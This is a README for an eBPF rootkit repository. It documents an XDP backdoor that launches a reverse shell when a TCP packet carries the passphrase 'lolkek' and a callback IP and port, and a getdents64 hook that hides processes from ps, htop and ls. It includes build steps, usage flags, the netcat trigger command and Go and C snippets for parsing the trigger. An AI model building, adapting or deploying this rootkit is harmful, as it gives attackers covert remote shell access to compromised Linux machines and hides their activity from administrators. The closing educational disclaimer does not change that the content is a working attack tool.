# eBPF-rootkit

This repository contains an eBPF rootkit that combines 2 main functions:

Backdoor for remote access - uses `XDP` (eXpress Data Path) to monitor network traffic and launch a reverse shell when detecting a specific pattern in packets.

Process Hiding - uses eBPF programs attached to the `getdents64` system call to hide specific processes from tools like `ps`, `htop`, `ls` etc.

The process hiding part is taken from the [bad-bpf repository](https://github.com/pathtofile/bad-bpf/), but the loader has been rewritten in Go.

## Dependencies
To build and run the project, you will need:

* Go (version 1.16+)
* Clang and LLVM (for compiling eBPF programs)
* Linux kernel header files
* Cilium eBPF library for Go

```bash
# Installing dependencies on Ubuntu/Debian:

sudo apt update  
sudo apt install -y clang llvm libbpf-dev linux-headers-$(uname -r)  
go get github.com/cilium/ebpf

# Building and Running

git clone https://github.com/cotsom/eBPF-rootkit.git  
cd eBPF-rootkit
go generate
go build -o ebpf-rootkit
```

## Usage

Run with root privileges:

```bash
./ebpf-rootkit [options]
Launch Options:
-p <PID> - PID of the process to hide (default: PID of the program itself)
-t <PPID> - Parent PID, will only affect its child processes
-i <interface> - Network interface to attach the XDP program to (default: eth0)
```


To launch the reverse shell, send a TCP packet containing your passphrase followed by the IP address and port to connect to, for example:

```bash
nc 192.168.1.100 22 # connect to victim machine with backdoor to any open port

# send command to nc
lolkek 192.168.123.200 4444
```

## Changing the Passphrase for the Reverse Shell
For now the passphrase that triggers the reverse shell is `lolkek`

```go
dataStr := string(data)
if strings.Contains(dataStr, "lolkek") {
    log.Printf("XDP: Found 'lolkek' trigger in packet data: %q", dataStr)
    parts := strings.Fields(dataStr)

...
```

and the number of bytes received from tcp payload is equal to the number of characters sent for the backdoor. Now this number is equal to 27
```bash
lolkek 192.168.123.200 4444 #27 characters
```

```C
//GET TCP DATA
unsigned char *tcpdata = (unsigned char *)tcp + tcp_header_bytes;

if ((void *)(tcpdata + 27) > data_end) {
    return XDP_PASS;
}

// Reserve space in the ring buffer
void *ringbuf_space = bpf_ringbuf_reserve(&xdprb, tcp_header_bytes, 0);
if (!ringbuf_space) {
    return XDP_PASS;  // If reservation fails, skip processing
}

// Copy the TCP header bytes into the ring buffer
// Using a loop to ensure compliance with eBPF verifier
for (int i = 0; i < 27; i++) {
    unsigned char byte = *((unsigned char *)tcpdata + i);
    ((unsigned char *)ringbuf_space)[i] = byte;
}
```

**To change the passphrase, replace the string `lolkek` with your own phrase. This phrase is used as a trigger to launch the reverse shell. And the number of bytes to be received.**

After changing the passphrase, you need to rebuild the project:
`go generate`
`go build -o ebpf-rootkit`


### Disclaimer
This tool is intended for educational purposes and security research only. Using this tool on systems without proper authorization may be illegal.
